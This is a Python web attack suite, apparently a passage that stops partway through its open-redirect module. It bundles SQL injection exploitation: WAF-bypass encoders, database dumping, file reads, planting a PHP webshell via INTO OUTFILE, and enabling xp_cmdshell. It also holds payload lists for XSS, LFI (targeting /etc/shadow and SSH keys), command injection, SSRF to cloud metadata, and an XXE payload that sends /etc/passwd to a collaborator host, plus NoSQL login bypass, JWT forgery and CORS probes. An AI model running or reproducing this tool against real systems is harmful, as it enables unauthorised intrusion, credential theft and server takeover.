#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HACKSUIT v5.0 ULTIMATE — All-in-One Web Attack Suite
SQLi | XSS | LFI/RCE | SSRF | CSRF | XXE | SSTI | NoSQL | JWT | GraphQL
CORS | CRLF | Open Redirect | Path Traversal | Host Header Injection
DirFuzz | Port | Subdomain | CMS | Brute | API Discovery | WAF Detect
Nikto | sqlmap | HTML/JSON/CSV Report | Screenshot | Reverse Shell Gen
"""
import re, sys, os, time, string, argparse, subprocess, shutil, socket, random
import json, csv, base64, hashlib, hmac, threading, queue, ipaddress
import concurrent.futures, webbrowser, ssl, urllib.parse
import requests
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, quote
from bs4 import BeautifulSoup

# ================= CẤU HÌNH CHUNG =================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}
TIMEOUT, DELAY = 10, 0.2
PROXY = None
COOKIE = None
AUTH = None
REPORT_DIR = "reports"
C = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m","M":"\033[95m","C":"\033[96m","W":"\033[0m"}

def banner():
    print(f"""{C['R']}
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
 ███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
 ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝{C['W']}
     HACKSUIT v5.0 ULTIMATE — Web Attack Suite
 SQLi|XSS|LFI/RCE|SSRF|CSRF|XXE|SSTI|NoSQL|JWT|GraphQL|CORS
 DirFuzz|Port|Subdomain|CMS|Brute|API|Nikto|sqlmap|Report
  {'-'*62}""")

def log(msg, level="INFO"):
    colors = {"INFO":C['B'],"OK":C['G'],"WARN":C['Y'],"VULN":C['R'],
              "NIKTO":C['M'],"SQLMAP":C['M'],"XSS":C['M'],"LFI":C['M'],
              "SSRF":C['M'],"CSRF":C['M'],"NMAP":C['M'],"BRUTE":C['M'],
              "DIR":C['M'],"SUB":C['M'],"DATA":C['M'],"XXE":C['C'],
              "SSTI":C['C'],"NoSQL":C['C'],"JWT":C['C'],"GRAPHQL":C['C'],
              "CORS":C['C'],"CRLF":C['C'],"REDIR":C['C'],"HOST":C['C'],
              "PATH":C['C'],"API":C['C'],"WAF":C['R'],"SSL":C['C'],
              "REPORT":C['G'],"SCREEN":C['M'],"SHELL":C['R']}
    print(f"{colors.get(level,'')}[{level:7}]{C['W']} {msg}")

def ensure_dir(d): os.makedirs(d, exist_ok=True)

def tool_exists(name):
    p = shutil.which(name)
    if not p: log(f"Thiếu tool '{name}'. Cài: sudo apt install {name}", "WARN")
    return p

def rand_marker(n=8):
    return "".join(random.choice("abcdef0123456789") for _ in range(n))

# ============================================================
#                    CORE ENGINE
# ============================================================
ERROR_PATTERNS = {
    "mysql":    [r"you have an error in your sql syntax", r"warning: mysql", r"mysqli?_"],
    "mssql":    [r"microsoft sql server", r"unclosed quotation mark"],
    "postgres": [r"postgresql.*error", r"unterminated quoted string", r"psql:"],
    "oracle":   [r"\bORA-\d{5}", r"quoted string not properly terminated"],
    "sqlite":   [r"sqlite3?\.\w+error", r"unrecognized token", r"malformed database schema"],
}
TIME_PAYLOADS = {
    "mysql":    ["' AND SLEEP({t})-- -", "' AND BENCHMARK(80000000,SHA1('a'))-- -"],
    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'-- -"],
    "postgres": ["'; SELECT pg_sleep({t})-- -"],
    "oracle":   ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{t})='a'-- -"],
    "sqlite":   ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"],
}
WAF_ENCODERS = [
    ("raw",             lambda p: p),
    ("comment-space",   lambda p: p.replace(" ", "/**/")),
    ("double-comment",  lambda p: p.replace("UNION","UNI/**/ON").replace("SELECT","SE/**/LECT").replace(" ","/**/")),
    ("urlencode",       lambda p: quote(p)),
    ("case-mix",        lambda p: re.sub(r"(union|select|from|and|or)", lambda m: m.group(1).upper(), p, flags=re.I)),
    ("inline-nullbyte", lambda p: p.replace("'", "'%00").replace(" ", "%09")),
    ("double-urlencode",lambda p: quote(quote(p))),
    ("unicode",         lambda p: p.replace("'", "%u0027").replace(" ", "%u0020")),
]

class Engine:
    def __init__(self, url=None, cookie=None):
        self.url = url
        self.s = requests.Session()
        self.s.headers.update(HEADERS)
        if cookie: self.s.headers["Cookie"] = cookie
        if PROXY: self.s.proxies = {"http": PROXY, "https": PROXY}
        if AUTH: self.s.auth = AUTH
        self.s.verify = False
        self.findings = []
        self.current = None
        self.dbms = None
        self.encoder = WAF_ENCODERS[0]
        self.ncols = None
        self.colpos = None
        self.waf = None
        ensure_dir(REPORT_DIR)

    def req(self, url, data=None, method="GET", headers=None, allow_redirects=True):
        time.sleep(DELAY)
        try:
            h = dict(HEADERS)
            if headers: h.update(headers)
            if method == "POST":
                return self.s.post(url, data=data, timeout=TIMEOUT, headers=h, allow_redirects=allow_redirects)
            return self.s.get(url, timeout=TIMEOUT, headers=h, allow_redirects=allow_redirects)
        except requests.RequestException as e:
            log(f"Lỗi request: {e}", "WARN"); return None

    def detect_waf(self):
        waf_sigs = {
            "Cloudflare": ["cf-ray","cf-cache-status","__cfduid","cloudflare"],
            "AWS WAF": ["x-amzn-RequestId","x-amz-cf-id"],
            "F5 BIG-IP": ["X-Cnection","X-WA-Info","BigIP"],
            "Akamai": ["Akamai","X-Akamai-Transformed"],
            "Sucuri": ["sucuri","X-Sucuri-ID"],
            "Imperva": ["imperva","X-Iinfo"],
            "ModSecurity": ["mod_security","ModSecurity"],
            "Barracuda": ["barracuda"],
            "Fortinet": ["FORTIWAFSID"],
            "Wordfence": ["Wordfence","wfvt_"],
        }
        try:
            r = self.s.get(self.url, timeout=TIMEOUT)
            blob = str(r.headers).lower() + r.text.lower()
            for waf, sigs in waf_sigs.items():
                for sig in sigs:
                    if sig.lower() in blob:
                        self.waf = waf
                        log(f"WAF phát hiện: {waf}", "WAF")
                        return waf
        except Exception: pass
        log("Không phát hiện WAF.", "OK")
        return None

    def extract_params(self):
        targets = []
        if self.url and urlparse(self.url).query:
            for p, v in parse_qsl(urlparse(self.url).query):
                targets.append({"url": self.url, "param": p, "base": v, "method": "GET", "data": None})
        r = self.req(self.url) if self.url else None
        if r:
            for form in BeautifulSoup(r.text, "html.parser").find_all("form"):
                action = urljoin(self.url, form.get("action") or self.url)
                fields = {i.get("name"): (i.get("value") or "test") for i in form.find_all("input")
                          if i.get("name") and i.get("type") != "submit"}
                if not fields: continue
                for p in fields:
                    targets.append({"url": action, "param": p, "base": fields[p],
                                    "method": form.get("method", "GET").upper(), "data": fields})
        return targets

    def inject(self, t, payload):
        if t["method"] == "POST":
            d = dict(t["data"]); d[t["param"]] = t["base"] + payload
            return self.req(t["url"], data=d, method="POST")
        qs = dict(parse_qsl(urlparse(t["url"]).query))
        qs[t["param"]] = t["base"] + payload
        u = urlparse(t["url"])
        return self.req(f"{u.scheme}://{u.netloc}{u.path}?{urlencode(qs)}")

    def send(self, payload):
        if self.encoder: payload = self.encoder[1](payload)
        return self.inject(self.current, payload)

    # ---------- SQLi detection ----------
    def detect_dbms(self, text):
        for dbms, pats in ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, text, re.I): return dbms
        return None

    def sqli_detect(self, t):
        self.current = t
        base_r = self.req(t["url"], data=t["data"], method=t["method"])
        if not base_r: return None
        for q in ["'", '"', "')", "';"]:
            r = self.inject(t, q)
            if r and (d := self.detect_dbms(r.text)):
                return {"type": "error-based", "dbms": d}
        rt = self.inject(t, "' AND 1=1-- -"); rf = self.inject(t, "' AND 1=2-- -")
        if rt and rf and rt.text != rf.text:
            return {"type": "boolean-based", "dbms": None}
        for dbms, pls in TIME_PAYLOADS.items():
            for pl in pls:
                t0 = time.time()
                r = self.inject(t, pl.format(t=6))
                if r and time.time() - t0 > 5:
                    return {"type": "time-based", "dbms": dbms}
        return None

    def waf_bypass(self):
        if not self.current: return False
        r = self.inject(self.current, "' UNION SELECT NULL-- -")
        markers = ["cloudflare","mod_security","forbidden","sucuri","imperva","akamai","blocked","firewall","request rejected"]
        if r and not any(m in r.text.lower() for m in markers):
            self.encoder = WAF_ENCODERS[0]; log("Encoder RAW pass.", "OK"); return True
        for name, enc in WAF_ENCODERS[1:]:
            self.encoder = (name, enc)
            r = self.send("' UNION SELECT NULL-- -")
            if r and not any(m in r.text.lower() for m in markers):
                log(f"WAF bypass OK: {name}", "OK"); return True
        self.encoder = WAF_ENCODERS[0]; log("Tất cả encoder fail.", "WARN"); return False

    def find_union(self):
        if not self.current:
            log("Chưa chọn target SQLi.", "WARN"); return False
        n_found = None
        for n in range(1, 51):
            r = self.send(f"' ORDER BY {n}-- -")
            if r and (self.detect_dbms(r.text) or "unknown column" in r.text.lower()):
                n_found = n - 1; break
        if not n_found:
            for n in range(1, 51):
                r = self.send(f"' UNION SELECT {','.join(['NULL']*n)}-- -")
                if r and not self.detect_dbms(r.text):
                    n_found = n; break
        if not n_found:
            log("Không tìm được số cột union.", "WARN"); return False
        self.ncols = n_found
        log(f"Số cột: {n_found}", "OK")
        tag = rand_marker()
        for pos in range(n_found):
            parts = ["NULL"] * n_found
            parts[pos] = f"CONCAT(0x6c61726b,{tag},0x656e64)"
            r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
            if r and tag in r.text:
                self.colpos = pos
                log(f"Cột hiển thị: #{pos+1}", "OK"); return True
        log("Không có cột hiển thị — dùng blind.", "WARN"); return False

    def uquery(self, inner):
        if self.ncols is None or self.colpos is None: return None
        parts = ["NULL"] * self.ncols
        parts[self.colpos] = f"CONCAT(0x6c61726b,IFNULL(({inner}),0x4e554c4c),0x656e64)"
        r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
        if not r: return None
        m = re.search(r"lark(.*?)end", r.text, re.S)
        return m.group(1) if m else None

    def sqli_info(self):
        queries = {
            "mysql":  ["version()","database()","user()","@@hostname","@@version_compile_os"],
            "postgres":["version()","current_database()","current_user","inet_server_addr()::text","current_setting('server_version')"],
            "mssql":  ["@@version","DB_NAME()","SYSTEM_USER","@@servername","@@version"],
            "oracle": ["(SELECT banner FROM v$version WHERE rownum=1)",
                       "(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual)","user","'n/a'","'n/a'"],
            "sqlite": ["sqlite_version()","'n/a'","'n/a'","'n/a'","'n/a'"],
        }
        log("== DB INFO ==", "VULN")
        for label, expr in zip(["Version","DB","User","Host","OS"], queries.get(self.dbms or "mysql", queries["mysql"])):
            print(f"  {label:8}: {self.uquery(expr) or 'N/A'}")

    def sqli_dbs(self):
        q = {"mysql":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
             "postgres":"SELECT string_agg(datname,',') FROM pg_database",
             "mssql":"SELECT STRING_AGG(name,',') FROM sys.databases",
             "oracle":"SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users"}
        val = self.uquery(q.get(self.dbms or "mysql", q["mysql"]))
        if val: log(f"Databases: {val}", "VULN"); return val.split(",")
        log("Không lấy được DB list.", "WARN")

    def sqli_tables(self, db=None):
        d = self.dbms or "mysql"
        if d == "mysql":
            where = f"table_schema='{db}'" if db else "table_schema=database()"
            val = self.uquery(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE {where}")
        elif d == "postgres":
            val = self.uquery("SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'")
        elif d == "mssql":
            val = self.uquery("SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'")
        else: val = None
        if val: log(f"Tables: {val}", "VULN"); return val.split(",")

    def sqli_cols(self, table):
        val = self.uquery(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")
        if val: log(f"Columns[{table}]: {val}", "VULN"); return val.split(",")

    def sqli_dump(self, table, cols, limit=20):
        colstr = ",".join(cols[:5])
        inner = f"SELECT GROUP_CONCAT({colstr} SEPARATOR ';|;') FROM (SELECT {colstr} FROM {table} LIMIT {limit}) x"
        val = self.uquery(inner)
        if val:
            log(f"== DUMP {table} ==", "VULN")
            for row in val.split(";|;"): print(f"  | {row}")
        else: log("Dump fail — dùng sqlmap [23].", "WARN")

    def sqli_readfile(self, path):
        val = self.uquery(f"SELECT LOAD_FILE('{path}')")
        if val: log(f"File {path}:", "VULN"); print(val[:2000])
        else: log("LOAD_FILE fail (cần FILE priv).", "WARN")

    def sqli_writefile(self, path, content):
        """Ghi file qua INTO OUTFILE (MySQL)"""
        hexc = content.encode().hex()
        payload = f"' UNION SELECT 0x{hexc} INTO OUTFILE '{path}'-- -"
        r = self.send(payload)
        if r and "error" not in r.text.lower(): log(f"Ghi file OK: {path}", "VULN")
        else: log("Ghi file fail.", "WARN")

    def sqli_rce_mysql(self, cmd="id"):
        """MySQL RCE via UDF / INTO OUTFILE webshell"""
        log("MySQL RCE — thử UDF + INTO OUTFILE", "VULN")
        shell = "<?php system($_GET['c']); ?>"
        for path in ["/var/www/html/shell.php","/var/www/shell.php","/usr/share/nginx/html/shell.php","C:/inetpub/wwwroot/shell.php"]:
            self.sqli_writefile(path, shell)
            log(f"Đã thử: {path}", "OK")

    def sqli_mssql_rce(self, cmd="whoami"):
        """MSSQL xp_cmdshell RCE"""
        log("MSSQL RCE via xp_cmdshell", "VULN")
        for p in [f"'; EXEC xp_cmdshell '{cmd}'-- -",
                  f"'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -",
                  f"'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -",
                  f"'; EXEC xp_cmdshell '{cmd}'-- -"]:
            self.send(p)

# ============================================================
#                    MODULE: XSS
# ============================================================
XSS_PAYLOADS = [
    '<script>alert(1)</script>','"><img src=x onerror=alert(1)>',"'-alert(1)-'",
    '<svg onload=alert(1)>','<img src=x onerror=confirm(1)>','"><svg/onload=prompt(1)>',
    'javascript:alert(1)','<iframe src=javascript:alert(1)>','<body onload=alert(1)>',
    '"><Script>alert(1)</scrIpt>','<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>','<video><source onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>','"><svg><script>alert(1)</script>',
    '{{7*7}}','${7*7}','<%= 7*7 %>',
]

def xss_scan(engine):
    log("=== XSS SCANNER ===", "XSS")
    targets = engine.extract_params()
    if not targets: log("Không có param.", "WARN"); return
    for t in targets:
        for i, pl in enumerate(XSS_PAYLOADS):
            tag = f"hks{i}"
            payload = pl.replace("alert(1)", f"alert('{tag}')") \
                        .replace("confirm(1)", f"confirm('{tag}')") \
                        .replace("prompt(1)", f"prompt('{tag}')")
            r = engine.inject(t, payload)
            if r and tag in r.text:
                log(f"[!] XSS REFLECTED: {t['param']} → {payload[:60]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "xss",
                                        "payload": payload, "method": t["method"]})
                break
    log("XSS scan xong.", "OK")

# ============================================================
#                    MODULE: LFI / RCE
# ============================================================
LFI_PAYLOADS = [
    "../../../../etc/passwd","....//....//....//etc/passwd","/etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd","%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "../../../../etc/passwd%00","/proc/self/environ",
    "../../../../etc/shadow","../../../../root/.ssh/id_rsa",
    "../../../../var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "expect://id","data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "file:///etc/passwd","C:\\Windows\\win.ini","..\\..\\..\\..\\windows\\win.ini",
]
RCE_PAYLOADS = ["; id","| id","$(id)","`id`","&& id","; cat /etc/passwd","$(cat /etc/passwd)",
                "| cat /etc/passwd","; whoami","%0aid","%0d%0aid","; sleep 5"]

def lfi_scan(engine):
    log("=== LFI / RCE SCANNER ===", "LFI")
    targets = engine.extract_params()
    for t in targets:
        for pl in LFI_PAYLOADS:
            r = engine.inject(t, pl)
            if r and (re.search(r"root:x:0:0:", r.text) or "daemon:x:" in r.text or "[extensions]" in r.text):
                log(f"[!] LFI: {t['param']} → {pl[:60]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "lfi",
                                        "payload": pl, "method": t["method"]})
                # Hiển thị trích đoạn
                m = re.search(r"(root:.*?\n)", r.text)
                if m: print(f"      ↳ {m.group(1)[:120]}")
                break
        for pl in RCE_PAYLOADS:
            t0 = time.time()
            r = engine.inject(t, pl)
            dt = time.time() - t0
            if r and (re.search(r"uid=\d+\(.*?\)", r.text) or "www-data" in r.text or "root:" in r.text):
                log(f"[!] COMMAND INJECTION: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "rce",
                                        "payload": pl, "method": t["method"]})
                break
            if dt > 4.5 and "sleep" in pl:
                log(f"[!] TIME-BASED CMD INJ: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "rce-time",
                                        "payload": pl, "method": t["method"]})
                break
    log("LFI/RCE scan xong.", "OK")

# ============================================================
#                    MODULE: SSRF
# ============================================================
SSRF_PARAM_HINTS = re.compile(r"url|path|src|dest|redirect|uri|target|fetch|load|page|file|link|host|proxy|next|data|reference|site|html|val|img|domain|callback|return|continue", re.I)
SSRF_PAYLOADS = [
    "http://127.0.0.1","http://localhost","http://localhost:8080","http://[::1]","http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd","gopher://127.0.0.1:25/_HELO",
    "dict://127.0.0.1:6379/INFO","http://2130706433/","http://0177.0.0.1/",
    "http://localhost:3306","http://localhost:6379","http://localhost:9200",
]

def ssrf_scan(engine, oob_token=None):
    log("=== SSRF SCANNER ===", "SSRF")
    oob_base = f"https://webhook.site/{oob_token}" if oob_token else None
    targets = engine.extract_params()
    ssrf_targets = [t for t in targets if SSRF_PARAM_HINTS.search(t["param"])]
    if not ssrf_targets:
        log("Không có param nghi SSRF. Test tất cả? (y/N)", "WARN")
        if input().strip().lower() == "y": ssrf_targets = targets
    for t in ssrf_targets:
        for pl in SSRF_PAYLOADS:
            r = engine.inject(t, pl)
            if not r: continue
            text = r.text.lower()
            if re.search(r"ami-id|root:x:0:0:|instance-id|connection refused|curl error|metadata|localhost", text):
                log(f"[!] SSRF: {t['param']} → {pl[:60]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssrf",
                                        "payload": pl, "method": t["method"]})
                break
        if oob_base:
            canary = f"{oob_base}?ping={t['param']}"
            engine.inject(t, canary); time.sleep(3)
            try:
                api = requests.get(f"https://webhook.site/token/{oob_token}/requests", timeout=10).json()
                if api.get("data"):
                    log(f"[!] SSRF OOB: {t['param']}", "VULN")
                    engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssrf-oob",
                                            "payload": canary, "method": t["method"]})
            except Exception: pass
    log("SSRF scan xong.", "OK")

# ============================================================
#                    MODULE: CSRF
# ============================================================
def csrf_check(engine):
    log("=== CSRF CHECK ===", "CSRF")
    r = engine.req(engine.url)
    if not r: return
    forms = BeautifulSoup(r.text, "html.parser").find_all("form")
    if not forms: log("Không có form.", "WARN"); return
    csrf_names = re.compile(r"csrf|_token|token|authenticity|xsrf|nonce|anticsrf|__requestverifytoken", re.I)
    for i, form in enumerate(forms):
        action = urljoin(engine.url, form.get("action") or engine.url)
        method = (form.get("method") or "GET").upper()
        fields = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
        hidden = [inp.get("name") for inp in form.find_all("input", type="hidden")]
        if not any(csrf_names.search(f or "") for f in hidden):
            log(f"[!] Form #{i} ({method}) — KHÔNG CSRF token. Fields: {fields[:5]}", "VULN")
            engine.findings.append({"url": action, "param": f"form#{i}", "type": "csrf", "method": method})
        else:
            data = {inp.get("name"): (inp.get("value") or "test") for inp in form.find_all("input")
                    if inp.get("name") and not csrf_names.search(inp.get("name") or "")}
            r2 = engine.req(action, data=data, method=method)
            if r2 and r2.status_code in (200, 302):
                log(f"[?] Form #{i} submit không token → {r2.status_code}", "VULN")
                engine.findings.append({"url": action, "param": f"form#{i}", "type": "csrf-novalidate",
                                        "method": method, "payload": f"status={r2.status_code}"})
    log("CSRF check xong.", "OK")

# ============================================================
#                    MODULE: XXE
# ============================================================
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><root>&x;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % p SYSTEM "http://COLLAB/xxe.dtd">%p;]><root/>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&x;</root>',
    '<!DOCTYPE root [<!ENTITY % a "file:///etc/passwd"><!ENTITY % b "<!ENTITY &#x25; c SYSTEM \'http://COLLAB/?%a;\'>">%b;%c;]>',
]

def xxe_scan(engine, collab=None):
    log("=== XXE SCANNER ===", "XXE")
    if not collab:
        collab = input("Collaborator URL (Enter = skip OOB): ").strip()
    targets = engine.extract_params()
    for t in targets:
        for raw in XXE_PAYLOADS:
            pl = raw.replace("COLLAB", collab or "127.0.0.1:9999")
            if t["method"] == "POST":
                r = engine.req(t["url"], data=pl, method="POST",
                               headers={"Content-Type": "application/xml"})
            else:
                r = engine.inject(t, pl)
            if r and (re.search(r"root:x:0:0:|\[extensions\]", r.text)):
                log(f"[!] XXE: {t['param']} → LFI", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "xxe",
                                        "payload": pl[:80], "method": t["method"]})
                break
    log("XXE scan xong.", "OK")

# ============================================================
#                    MODULE: SSTI
# ============================================================
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"), ("#{7*7}", "49"), ("*{7*7}", "49"),
    ("{{config}}", "Config"), ("{{self}}", "TemplateReference"),
    ("${7*7}", "49"), ("@(7*7)", "49"), ("{{'7'*7}}", "7777777"),
    ("{{ ''.__class__.__mro__[2].__subclasses__() }}", "__subclasses__"),
]

def ssti_scan(engine):
    log("=== SSTI SCANNER ===", "SSTI")
    targets = engine.extract_params()
    for t in targets:
        for pl, expect in SSTI_PAYLOADS:
            r = engine.inject(t, pl)
            if r and expect in r.text and pl not in r.text:
                log(f"[!] SSTI: {t['param']} → {pl} (kết quả: {expect})", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssti",
                                        "payload": pl, "method": t["method"]})
                break
    log("SSTI scan xong.", "OK")

# ============================================================
#                    MODULE: NoSQL
# ============================================================
NOSQL_PAYLOADS = [
    ("username[$ne]=x&password[$ne]=x", "bypass"),
    ("username[$gt]=&password[$gt]=", "bypass"),
    ("username[$regex]=.*&password[$regex]=.*", "regex"),
    ("{\"username\":{\"$ne\":\"x\"},\"password\":{\"$ne\":\"x\"}}", "json"),
    ("username=admin&password[$ne]=x", "mixed"),
]

def nosql_scan(engine):
    log("=== NoSQL INJECTION SCANNER ===", "NoSQL")
    targets = engine.extract_params()
    login_params = [t for t in targets if re.search(r"user|login|email|pass", t["param"], re.I)]
    if not login_params: login_params = targets
    for t in login_params:
        for payload, kind in NOSQL_PAYLOADS:
            if "$" in payload and t["method"] == "POST":
                r = engine.req(t["url"], data=payload, method="POST")
            else:
                r = engine.inject(t, payload)
            if r and r.status_code in (200, 302) and \
               not re.search(r"invalid|incorrect|wrong|fail", r.text, re.I):
                log(f"[!] NoSQL: {t['param']} → {kind}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "nosql",
                                        "payload": payload, "method": t["method"]})
                break
    log("NoSQL scan xong.", "OK")

# ============================================================
#                    MODULE: JWT
# ============================================================
def jwt_decode(token):
    try:
        parts = token.split(".")
        if len(parts) != 3: return None
        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        pay = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        return {"header": hdr, "payload": pay, "signature": parts[2]}
    except Exception: return None

def jwt_scan(engine):
    log("=== JWT ATTACKS ===", "JWT")
    token = input("Nhập JWT token: ").strip()
    decoded = jwt_decode(token)
    if not decoded:
        log("Token không hợp lệ.", "WARN"); return
    log(f"Header: {decoded['header']}", "OK")
    log(f"Payload: {json.dumps(decoded['payload'])[:200]}", "OK")
    alg = decoded["header"].get("alg", "").upper()
    if alg == "NONE":
        log("[!] JWT dùng alg=none — dễ bypass!", "VULN")
    # Test alg=none
    none_hdr = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
    none_pay = base64.urlsafe_b64encode(json.dumps(decoded["payload"]).encode()).rstrip(b"=").decode()
    none_tok = f"{none_hdr}.{none_pay}."
    log(f"Thử alg=none: {none_tok[:60]}...", "OK")
    # Brute weak secrets
    common_secrets = ["secret","password","123456","jwt","admin","key","test","jwtsecret",
                      "mysecret","your-256-bit-secret","changeme","secretkey","supersecret"]
    for sec in common_secrets:
        sig = base64.urlsafe_b64encode(
            hmac.new(sec.encode(), f"{none_hdr}.{none_pay}".encode(), hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        if sig == decoded["signature"]:
            log(f"[!] JWT SECRET FOUND: '{sec}'", "VULN")
            engine.findings.append({"url": "jwt", "param": "alg=HS256", "type": "jwt-brute",
                                    "payload": sec, "method": "-"})
            return
    log("Không crack được secret trong wordlist ngắn.", "WARN")

# ============================================================
#                    MODULE: GraphQL
# ============================================================
def graphql_scan(engine):
    log("=== GRAPHQL SCANNER ===", "GRAPHQL")
    endpoints = ["/graphql","/graphiql","/api/graphql","/v1/graphql","/query","/gql"]
    for ep in endpoints:
        url = urljoin(engine.url, ep)
        try:
            r = engine.req(url, data='{"query":"{__schema{types{name}}}"}', method="POST",
                           headers={"Content-Type": "application/json"})
            if r and ("__schema" in r.text or "types" in r.text):
                log(f"[!] GraphQL endpoint: {url}", "VULN")
                log(f"    Introspection: OK", "OK")
                # Thử query nguy hiểm
                r2 = engine.req(url, data='{"query":"query{__schema{mutationType{fields{name}}}}"}', method="POST",
                                headers={"Content-Type": "application/json"})
                if r2 and "mutationType" in r2.text:
                    log("    Mutation type lấy được — có thể modify data!", "VULN")
                engine.findings.append({"url": url, "param": "-", "type": "graphql",
                                        "payload": "introspection enabled", "method": "POST"})
        except Exception: pass
    log("GraphQL scan xong.", "OK")

# ============================================================
#                    MODULE: CORS
# ============================================================
def cors_scan(engine):
    log("=== CORS MISCONFIGURATION ===", "CORS")
    origins = ["http://evil.com", "null", "https://attacker.io", "http://localhost"]
    for orig in origins:
        r = engine.req(engine.url, headers={"Origin": orig})
        if r:
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao == orig and acac == "true":
                log(f"[!] CORS nguy hiểm: reflect {orig} + credentials", "VULN")
                engine.findings.append({"url": engine.url, "param": "Origin", "type": "cors",
                                        "payload": f"{orig} + credentials=true", "method": "GET"})
            elif acao == "*" and acac == "true":
                log("[!] CORS wildcard + credentials!", "VULN")
                engine.findings.append({"url": engine.url, "param": "Origin", "type": "cors",
                                        "payload": "* + credentials", "method": "GET"})
    log("CORS scan xong.", "OK")

# ============================================================
#                    MODULE: CRLF
# ============================================================
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injected",
    "%0d%0aX-Injected:crlf",
    "\r\nSet-Cookie: crlf=injected",
    "%0aSet-Cookie:crlf=injected",
    "%0d%0aLocation:http://evil.com",
]

def crlf_scan(engine):
    log("=== CRLF INJECTION ===", "CRLF")
    targets = engine.extract_params()
    for t in targets:
        for pl in CRLF_PAYLOADS:
            r = engine.inject(t, pl)
            if r and ("crlf=injected" in str(r.headers) or "X-Injected" in str(r.headers)
                      or "evil.com" in r.headers.get("Location", "")):
                log(f"[!] CRLF: {t['param']} → {pl[:40]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "crlf",
                                        "payload": pl, "method": t["method"]})
                break
    log("CRLF scan xong.", "OK")

# ============================================================
#                    MODULE: OPEN REDIRECT
# ============================================================
REDIR_PARAMS = re.compile(r"redirect|url|next|return|goto|redir|dest|continue|target|callback|r|u", re.I)
REDIR_PAYLOADS = ["//evil.com","http://evil.com","https://evil.com","//google.com",
                  "//evil.com/%2F..","https://evil.com@legit.com","//evil.com#@legit.com"]

def open_redirect_scan(engine):
    log("=== OPEN REDIRECT ===", "REDIR")
    targets = engine.extract_params()
    for t in targets:
        if not REDIR_PARAMS.search(t["param"]): continue
        for pl in REDIR_PAYLOADS:
            r = engine.req(engine.inject(t, pl).url if hasattr(engine.inject(t, pl), 'url') else engine.url,
                           allow_redirects=False)
            if r and r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location", "")
                if "evil.com" in loc or "google.com" in loc:
                    log(f"[!] OPEN REDIRECT: {t['param']} → {pl}", "VULN")
